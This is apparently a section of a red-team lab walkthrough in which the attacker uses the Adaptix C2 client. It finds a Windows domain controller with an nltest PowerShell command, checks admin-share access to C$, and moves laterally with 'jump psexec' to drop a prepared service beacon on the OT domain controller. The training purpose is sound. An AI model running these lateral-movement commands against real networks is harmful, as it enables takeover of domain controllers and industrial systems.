<div class="attacker-container">
    <div class="attacker-label">Locating DC</div>
<br>

Before we can move laterally, we need to know who our target is. We want to **move laterally** to the domain controller. We don't yet want to do an **NMAP** scan so we'll be using **powershell** to find the **name** of our **domain** and also the name of the **domain controller**.
	
Built into the Adaptix client is a possibility to run **powershell** commands with the **beacon**. For this we just need to do **powershell** *command*. In our case it will be:
	
```
powershell nltest /dsgetdc:$( (Get-CimInstance Win32_ComputerSystem).Domain )
```
	
![Powershell command to display DC](/images/Powershell_find_DC.jpg)

So with this we know 2 things:
1. Domain: ot.fromblackouttolockout.exn.local
2. DC name: DC-OT-01
	
Let’s first see if we have **access** to the **share** of the **domain controller**.
To do this, we can do
	
```
dir \\DC-OT-01\c$
```
	
![dir OT directory](/images/Dir_OT_Domain_While_Admin_Context.jpg)
	
When this gives a result like you see below, it means you **have access** to this **share**. Here you also see something interesting called **VPN Share**. Let's keep this in mind for later.
</div>

<div class="attacker-container">
    <div class="attacker-label">Lateral Movement</div>
<br>
	
Now we will use this to **drop** a **service beacon**. We have already prepared the service exe and you can find it under `home/sysadmin/AdaptixProjects/ShadowHackers/DCOThacked.exe`

<div class="info">

PsExec is a light-weight telnet-replacement that lets you **execute processes** on other **systems**, complete with **full interactivity** for console applications, **without** having to **manually install** client software.
</div>
</br>
	
**jump psexec** is part of the **lateral movement BOF** which we have built in the Adaptix Client:
	
```
jump psexec DC-OT-01 /home/sysadmin/AdaptixProjects/ShadowHackers/DCOThacked.exe
```

![dir OT directory](/images/GettingIntoDCOT.jpg)

Now you will see that a **third session** is there. This is a **session** towards the **Domain Controller**.
Also have a look at the **session graph**, there you will see in a glimps which sessions we have and which **protocols** are being used.
	
![dir OT directory](/images/SessionGraph_With_AllDevices_OT.jpg)

	
Now let's be sure, type **whoami** to see which user you are on the domain controller and which **privileges** you have there. Because after we have **control** over the **OT environment**, we'll be **going** to the **IT environment**.

</div>
